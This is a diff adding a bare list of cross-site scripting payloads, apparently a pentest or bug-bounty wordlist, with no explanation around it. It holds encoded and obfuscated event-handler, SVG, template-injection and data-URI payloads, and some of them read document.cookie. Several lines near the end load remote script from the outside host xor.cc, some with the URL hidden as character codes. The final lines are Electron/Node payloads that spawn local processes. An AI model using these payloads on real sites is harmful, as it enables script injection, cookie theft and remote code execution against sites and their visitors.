@@ -1,0 +1,77 @@
+<iframe/src=//l.io>
+<img/src=//.io>
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+<svg%0Aonauxclick=0;[1].some(confirm)//
+<svg onx=() onload=(confirm)(1)>
+</Scrpt/"%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+“}%3c%25%30%30%73%76%67%26%23%78%30%39%3b%78%2f%25%30%30%6f%6e%6c%6f%61%64%3d%26%23%30%30%30%30%30%39%37%26%23%30%30%30%30%31%30%38%26%23%30%30%30%30%31%30%31%26%23%30%30%30%30%31%31%34%26%23%30%30%30%30%31%31%36%26%23%30%30%30%30%30%34%30%26%23%30%30%30%30%31%30%30%26%23%30%30%30%30%31%31%31%26%23%30%30%30%30%30%39%39%26%23%30%30%30%30%31%31%37%26%23%30%30%30%30%31%30%39%26%23%30%30%30%30%31%30%31%26%23%30%30%30%30%31%31%30%26%23%30%30%30%30%31%31%36%26%23%30%30%30%30%30%34%36%26%23%30%30%30%30%31%30%30%26%23%30%30%30%30%31%31%31%26%23%30%30%30%30%31%30%39%26%23%30%30%30%30%30%39%37%26%23%30%30%30%30%31%30%35%26%23%30%30%30%30%31%31%30%26%23%30%30%30%30%30%34%31%3e
+<x onauxclick=a=alert,a(domain)>click
+<!- - ><img title="--><"onmouseover=alert(1)>+bad=true
+search"="><img src=a.com onerror=alert(1)>"<
+<img src=xx onerror=alert(1)>
+'+onclick=alert(1)+'
+”/>&lt;script>alert(1)&lt;/script&gt”/>
+javascript:prompt(1)%2f%2f
+"/>&lt;svg onload=alert(1)&gt;"/>
+<noscript><p tittle="</noscript><img src=x onerror=alert(1)>">
+<noscript><p tittle="</noscript>#<img src=x onerror=prompt(1)>">
+"%20onmouseover=alert(document.cookie)%20">
+" onmouseover=alert(document.cookie) bad="
+%22%20onmouseover%3dalert(document.cookie)%20bad%3d%22
+<p tittle="</>"<img src=x onerror=alert(document.domain)//
+alert(document.cookie);confirm(1)
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+%3Cp%20tittle%3D%22%3C%2F%3E%22%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%2F%2F
+%253Cp%2520tittle%253D%2522%253C%252F%253E%2522%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528document.domain%2529%252F%252F
+" onclick=alert(location.host) SecAnalysts="
+"+onclick=alert(location.host)+SecAnalysts="
+<p tittle="</>#<img src=x onerror=alert(document.domain)//
+{{constructor.constructor(%27prompt(document.domain)%27)()}}
+<svg/onload=alert(1)>
+%253Csvg onload=alert0)%253E
+“ OnMouseOver=”prompt`1`
+%22%20o%3Cp%3Enmouseover=%22alert(document['cookie'])%22
+"><svg/onload=alert(/XSS/)
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+<body ontouchstart=alert(1)>
+onclick="alert(1)">
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+"><svg/onload=confirm(1)>"@x.y
+prompt`${document.domain}`
+“><svg/onload=alert(document.domain)>”@x.y
+{{constructor.constructor(%27prompt(document.domain)%27)()}}
+<a"/onclick=(confirm)()>Click Here!"
+#"><img src=xx onerror=prompt(1)>
+#alert(document.domain)
+#"><img src=:// onerror=alert(2)>
+#javascript:alert(1)//
+<img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>
+"><img src=xx onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>
+#"><img src=xx onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>
+<img src=x onerror=$.getScript("//xor.cc")>
+<img src=xx onerror=$.getScript("//xor.cc")>
+<img src=:// onerror=$.getScript("//xor.cc")>
+"><img src=x onerror=$.getScript("//xor.cc")>
+">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>
+<script>require('child_process').exec('/usr/bin/gnome-calculator',function(){})</script>
